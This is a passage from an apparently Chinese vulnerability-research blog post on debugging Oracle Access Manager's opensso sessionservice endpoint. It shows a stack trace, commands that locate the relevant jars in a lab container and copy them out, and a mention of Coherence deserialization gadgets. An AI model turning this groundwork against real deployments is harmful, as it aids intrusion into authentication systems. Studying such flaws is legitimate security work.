</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-42><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-42>42</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-43><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-43>43</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-44><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-44>44</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-45><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-45>45</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-46><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-46>46</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-47><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-47>47</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-48><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-48>48</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-49><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-49>49</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-50><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-50>50</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-51><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-51>51</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-52><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-52>52</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-53><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-53>53</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-54><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-54>54</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-55><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-55>55</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-56><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-56>56</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>&lt;Mar 22, 2022 2:33:02,196 AM GMT&gt; &lt;Warning&gt; &lt;oracle.oam.binding&gt; &lt;BEA-000000&gt; &lt;Error while processing Master Controller in PBL
</span></span><span style=display:flex><span>java.lang.NullPointerException
</span></span><span style=display:flex><span>★  at oracle.security.am.proxy.opensso.events.OpenssoCheckValidSessionEvent.isRequesterSessionID(OpenssoCheckValidSessionEvent.java:58)
</span></span><span style=display:flex><span>	at oracle.security.am.proxy.opensso.controller.OpenssoFlowController.getNextEventHint(OpenssoFlowController.java:515)
</span></span><span style=display:flex><span>	at oracle.security.am.controller.events.AbstractEventFlowController.getEventHint(AbstractEventFlowController.java:193)
</span></span><span style=display:flex><span>	at oracle.security.am.controller.events.AbstractEventFlowController.getSuccessFailEvent(AbstractEventFlowController.java:158)
</span></span><span style=display:flex><span>	at oracle.security.am.controller.events.AbstractEventFlowController.getNextEvent(AbstractEventFlowController.java:99)
</span></span><span style=display:flex><span>	at oracle.security.am.controller.MasterController.getNextEvent(MasterController.java:236)
</span></span><span style=display:flex><span>	at oracle.security.am.controller.MasterController.processEvent(MasterController.java:615)
</span></span><span style=display:flex><span>	at oracle.security.am.controller.MasterController.processRequest(MasterController.java:788)
</span></span><span style=display:flex><span>	at oracle.security.am.controller.MasterController.process(MasterController.java:708)
</span></span><span style=display:flex><span>	at oracle.security.am.pbl.PBLFlowManager.delegateToMasterController(PBLFlowManager.java:221)
</span></span><span style=display:flex><span>	at oracle.security.am.pbl.PBLFlowManager.handleBaseEvent(PBLFlowManager.java:147)
</span></span><span style=display:flex><span>	at oracle.security.am.pbl.PBLFlowManager.processRequest(PBLFlowManager.java:107)
</span></span><span style=display:flex><span>	at oracle.security.am.pbl.transport.http.AMServlet.handleRequest(AMServlet.java:221)
</span></span><span style=display:flex><span>★  at oracle.security.am.pbl.transport.http.AMServlet.doPost(AMServlet.java:177)
</span></span><span style=display:flex><span>	at javax.servlet.http.HttpServlet.service(HttpServlet.java:707)
</span></span><span style=display:flex><span>	at javax.servlet.http.HttpServlet.service(HttpServlet.java:790)
</span></span><span style=display:flex><span>	at weblogic.servlet.internal.StubSecurityHelper$ServletServiceAction.run(StubSecurityHelper.java:295)
</span></span><span style=display:flex><span>	at weblogic.servlet.internal.StubSecurityHelper$ServletServiceAction.run(StubSecurityHelper.java:260)
</span></span><span style=display:flex><span>	at weblogic.servlet.internal.StubSecurityHelper.invokeServlet(StubSecurityHelper.java:137)
</span></span><span style=display:flex><span>	at weblogic.servlet.internal.ServletStubImpl.execute(ServletStubImpl.java:353)
</span></span><span style=display:flex><span>	at weblogic.servlet.internal.TailFilter.doFilter(TailFilter.java:25)
</span></span><span style=display:flex><span>	at weblogic.servlet.internal.FilterChainImpl.doFilter(FilterChainImpl.java:78)
</span></span><span style=display:flex><span>	at oracle.security.jps.ee.http.JpsAbsFilter$3.run(JpsAbsFilter.java:175)
</span></span><span style=display:flex><span>	at java.security.AccessController.doPrivileged(Native Method)
</span></span><span style=display:flex><span>	at oracle.security.jps.util.JpsSubject.doAsPrivileged(JpsSubject.java:315)
</span></span><span style=display:flex><span>	at oracle.security.jps.ee.util.JpsPlatformUtil.runJaasMode(JpsPlatformUtil.java:650)
</span></span><span style=display:flex><span>	at oracle.security.jps.ee.http.JpsAbsFilter.runJaasMode(JpsAbsFilter.java:112)
</span></span><span style=display:flex><span>	at oracle.security.jps.ee.http.JpsAbsFilter.doFilterInternal(JpsAbsFilter.java:293)
</span></span><span style=display:flex><span>	at oracle.security.jps.ee.http.JpsAbsFilter.doFilter(JpsAbsFilter.java:150)
</span></span><span style=display:flex><span>	at oracle.security.jps.ee.http.JpsFilter.doFilter(JpsFilter.java:94)
</span></span><span style=display:flex><span>	at weblogic.servlet.internal.FilterChainImpl.doFilter(FilterChainImpl.java:78)
</span></span><span style=display:flex><span>	at oracle.dms.servlet.DMSServletFilter.doFilter(DMSServletFilter.java:248)
</span></span><span style=display:flex><span>	at weblogic.servlet.internal.FilterChainImpl.doFilter(FilterChainImpl.java:78)
</span></span><span style=display:flex><span>	at oracle.jrf.servlet.ExtensibleGlobalFilter.doFilter(ExtensibleGlobalFilter.java:92)
</span></span><span style=display:flex><span>	at weblogic.servlet.internal.FilterChainImpl.doFilter(FilterChainImpl.java:78)
</span></span><span style=display:flex><span>	at weblogic.servlet.internal.WebAppServletContext$ServletInvocationAction.wrapRun(WebAppServletContext.java:3797)
</span></span><span style=display:flex><span>	at weblogic.servlet.internal.WebAppServletContext$ServletInvocationAction.run(WebAppServletContext.java:3763)
</span></span><span style=display:flex><span>	at weblogic.security.acl.internal.AuthenticatedSubject.doAs(AuthenticatedSubject.java:344)
</span></span><span style=display:flex><span>	at weblogic.security.service.SecurityManager.runAsForUserCode(SecurityManager.java:197)
</span></span><span style=display:flex><span>	at weblogic.servlet.provider.WlsSecurityProvider.runAsForUserCode(WlsSecurityProvider.java:203)
</span></span><span style=display:flex><span>	at weblogic.servlet.provider.WlsSubjectHandle.run(WlsSubjectHandle.java:71)
</span></span><span style=display:flex><span>	at weblogic.servlet.internal.WebAppServletContext.doSecuredExecute(WebAppServletContext.java:2451)
</span></span><span style=display:flex><span>	at weblogic.servlet.internal.WebAppServletContext.securedExecute(WebAppServletContext.java:2299)
</span></span><span style=display:flex><span>	at weblogic.servlet.internal.WebAppServletContext.execute(WebAppServletContext.java:2277)
</span></span><span style=display:flex><span>	at weblogic.servlet.internal.ServletRequestImpl.runInternal(ServletRequestImpl.java:1720)
</span></span><span style=display:flex><span>	at weblogic.servlet.internal.ServletRequestImpl.run(ServletRequestImpl.java:1680)
</span></span><span style=display:flex><span>	at weblogic.servlet.provider.ContainerSupportProviderImpl$WlsRequestExecutor.run(ContainerSupportProviderImpl.java:272)
</span></span><span style=display:flex><span>	at weblogic.invocation.ComponentInvocationContextManager._runAs(ComponentInvocationContextManager.java:352)
</span></span><span style=display:flex><span>	at weblogic.invocation.ComponentInvocationContextManager.runAs(ComponentInvocationContextManager.java:337)
</span></span><span style=display:flex><span>	at weblogic.work.LivePartitionUtility.doRunWorkUnderContext(LivePartitionUtility.java:57)
</span></span><span style=display:flex><span>	at weblogic.work.PartitionUtility.runWorkUnderContext(PartitionUtility.java:41)
</span></span><span style=display:flex><span>	at weblogic.work.SelfTuningWorkManagerImpl.runWorkUnderContext(SelfTuningWorkManagerImpl.java:655)
</span></span><span style=display:flex><span>	at weblogic.work.ExecuteThread.execute(ExecuteThread.java:420)
</span></span><span style=display:flex><span>	at weblogic.work.ExecuteThread.run(ExecuteThread.java:360)
</span></span></code></pre></td></tr></table></div></div><h2 id=确定关键断点的位置和相关的依赖包>④确定关键断点的位置和相关的依赖包<a hidden class=anchor aria-hidden=true href=#确定关键断点的位置和相关的依赖包>#</a></h2><p>从报错调用栈可以看到接口 <code>/oam/server/opensso/sessionservice</code> 是由 <code>oracle.security.am.pbl.transport.http.AMServlet.doPost(AMServlet.java:177)</code> 处理的，我们想知道这个类位于那个jar包中，以及整个请求处理过程依赖哪些jar包。</p><p>尝试以下方法：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-25>25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-26>26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-27>27</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-28><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-28>28</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-29><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-29>29</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-30><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-30>30</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-31><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-31>31</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-32><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-32>32</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-33><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-33>33</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-34><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-34>34</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-35><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-35>35</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-36><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-36>36</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-37><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-37>37</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-38><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-38>38</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-39><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-39>39</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-40><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-40>40</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-41><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-41>41</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-42><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-42>42</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-43><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-43>43</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-44><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-44>44</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-45><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-45>45</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-46><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-46>46</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-47><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-47>47</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-48><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-48>48</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-49><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-49>49</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-50><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-50>50</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-51><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-51>51</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>// 1. 生成容器中所有jar包内容的index
</span></span><span style=display:flex><span><span style=color:#75715e># docker exec oamms find / -name *.jar 2&gt;/dev/null -exec sh -c &#34;echo {};zipinfo -1 {} | grep -Pi &#39;\.(class|java|xml|conf|json|yaml|yml|config)$&#39;;echo &#39;---&#39;; &#34; \;  &gt; oamms_tree.txt</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>// index大致内容如下，用---分隔jar包，每个区块第一行是jar包名称，后续跟着class/java/config等代码和配置文件
</span></span><span style=display:flex><span><span style=color:#75715e># tail -n 20 oamms_tree.txt </span>
</span></span><span style=display:flex><span>com/sun/tools/visualvm/coredump/resources/layer.xml
</span></span><span style=display:flex><span>---
</span></span><span style=display:flex><span>/u01/jdk/lib/visualvm/visualvm/core/com-sun-tools-visualvm-modules-startup.jar
</span></span><span style=display:flex><span>com/sun/tools/visualvm/modules/startup/AcceptLicense$1.class
</span></span><span style=display:flex><span>com/sun/tools/visualvm/modules/startup/AcceptLicense.class
</span></span><span style=display:flex><span>com/sun/tools/visualvm/modules/startup/LicensePanel.class
</span></span><span style=display:flex><span>com/sun/tools/visualvm/modules/startup/Utils.class
</span></span><span style=display:flex><span>com/sun/tools/visualvm/modules/startup/VisualVMStartup.class
</span></span><span style=display:flex><span>com/sun/tools/visualvm/modules/startup/dialogs/StartupDialog$1.class
</span></span><span style=display:flex><span>com/sun/tools/visualvm/modules/startup/dialogs/StartupDialog$2.class
</span></span><span style=display:flex><span>com/sun/tools/visualvm/modules/startup/dialogs/StartupDialog$3.class
</span></span><span style=display:flex><span>com/sun/tools/visualvm/modules/startup/dialogs/StartupDialog$4.class
</span></span><span style=display:flex><span>com/sun/tools/visualvm/modules/startup/dialogs/StartupDialog.class
</span></span><span style=display:flex><span>---
</span></span><span style=display:flex><span>/u01/jdk/lib/visualvm/visualvm/core/locale/com-sun-tools-visualvm-modules-startup_zh_CN.jar
</span></span><span style=display:flex><span>---
</span></span><span style=display:flex><span>/u01/jdk/lib/visualvm/visualvm/core/locale/core_visualvm.jar
</span></span><span style=display:flex><span>---
</span></span><span style=display:flex><span>/u01/jdk/lib/visualvm/visualvm/core/locale/com-sun-tools-visualvm-modules-startup_ja.jar
</span></span><span style=display:flex><span>---
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>// 2. 定位关键类所在的jar包位置
</span></span><span style=display:flex><span><span style=color:#75715e># cls=&#34;oracle.security.am.pbl.transport.http.AMServlet&#34;</span>
</span></span><span style=display:flex><span><span style=color:#75715e># grep -P &#34;$cls|\.jar&#34; oamms_tree.txt |grep -P &#34;$cls&#34; -B1</span>
</span></span><span style=display:flex><span>/u01/oracle/user_projects/domains/access_domain/servers/oam_policy_mgr1/tmp/_WL_user/oam-jars/1jy5pi/APP-INF/lib/pbl.jar
</span></span><span style=display:flex><span>oracle/security/am/pbl/transport/http/AMServlet$1.class
</span></span><span style=display:flex><span>oracle/security/am/pbl/transport/http/AMServlet.class
</span></span><span style=display:flex><span>--
</span></span><span style=display:flex><span>/u01/oracle/user_projects/domains/access_domain/servers/AdminServer/tmp/_WL_user/oam-jars/n9twye/APP-INF/lib/pbl.jar
</span></span><span style=display:flex><span>oracle/security/am/pbl/transport/http/AMServlet$1.class
</span></span><span style=display:flex><span>oracle/security/am/pbl/transport/http/AMServlet.class
</span></span><span style=display:flex><span>--
</span></span><span style=display:flex><span>/u01/oracle/user_projects/domains/access_domain/servers/oam_server1/tmp/_WL_user/oam-jars/gkvqum/APP-INF/lib/pbl.jar
</span></span><span style=display:flex><span>oracle/security/am/pbl/transport/http/AMServlet$1.class
</span></span><span style=display:flex><span>oracle/security/am/pbl/transport/http/AMServlet.class
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># cls=&#34;oracle.security.am.proxy.opensso.events.OpenssoCheckValidSessionEvent&#34;</span>
</span></span><span style=display:flex><span><span style=color:#75715e># grep -P &#34;$cls|\.jar&#34; oamms_tree.txt |grep -P &#34;$cls&#34; -B1</span>
</span></span><span style=display:flex><span>/u01/oracle/user_projects/domains/access_domain/servers/oam_policy_mgr1/tmp/_WL_user/oam-jars/1jy5pi/APP-INF/lib/openssoproxy.jar
</span></span><span style=display:flex><span>oracle/security/am/proxy/opensso/events/OpenssoCheckValidSessionEvent.class
</span></span><span style=display:flex><span>--
</span></span><span style=display:flex><span>/u01/oracle/user_projects/domains/access_domain/servers/AdminServer/tmp/_WL_user/oam-jars/n9twye/APP-INF/lib/openssoproxy.jar
</span></span><span style=display:flex><span>oracle/security/am/proxy/opensso/events/OpenssoCheckValidSessionEvent.class
</span></span><span style=display:flex><span>--
</span></span><span style=display:flex><span>/u01/oracle/user_projects/domains/access_domain/servers/oam_server1/tmp/_WL_user/oam-jars/gkvqum/APP-INF/lib/openssoproxy.jar
</span></span><span style=display:flex><span>oracle/security/am/proxy/opensso/events/OpenssoCheckValidSessionEvent.class
</span></span></code></pre></td></tr></table></div></div><p>可以看到 <code>oracle.security.am.proxy.opensso.events.OpenssoCheckValidSessionEvent</code>所在的jar包为<code>openssoproxy.jar</code> ，<code>oracle.security.am.pbl.transport.http.AMServlet</code> 所在jar包为 pbl.jar，他们都位于 <code>/u01/oracle/user_projects/domains/access_domain/servers/oam_server1/tmp/_WL_user/oam-jars/gkvqum/APP-INF/lib/</code> 目录下（注意：gkvqum是随机生成的目录，不同部署实例上的路径大概率是不同的，但目录结构是一样的）。所以我们将该目录下的jar包全部下载到调试主机上。</p><h2 id=下载依赖包到调试主机>⑤下载依赖包到调试主机<a hidden class=anchor aria-hidden=true href=#下载依赖包到调试主机>#</a></h2><p>根据上一步知道我们关心的jar包应该主要是在 <code>/u01/oracle/user_projects/domains/access_domain/servers/oam_server1/tmp/_WL_user/oam-jars/gkvqum/APP-INF/lib/</code> 目录下。</p><p>下载oracle依赖包</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-48-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-48-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-48-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-48-2>2</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>docker exec oamms tar czf /tmp/oraclelib.tgz /u01/oracle/user_projects/domains/access_domain/servers/oam_server1/tmp/_WL_user/oam-jars/gkvqum/APP-INF/lib/
</span></span><span style=display:flex><span>docker cp oamms:/tmp/oraclelib.tgz .
</span></span></code></pre></td></tr></table></div></div><p>此外我们后续调试还需要用到weblogic的jar包信息和coherence中的gadget信息，这里一并生成并下载</p><p>生成和下载 wlfuulclient.jar</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-49-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-49-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-49-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-49-2>2</a>
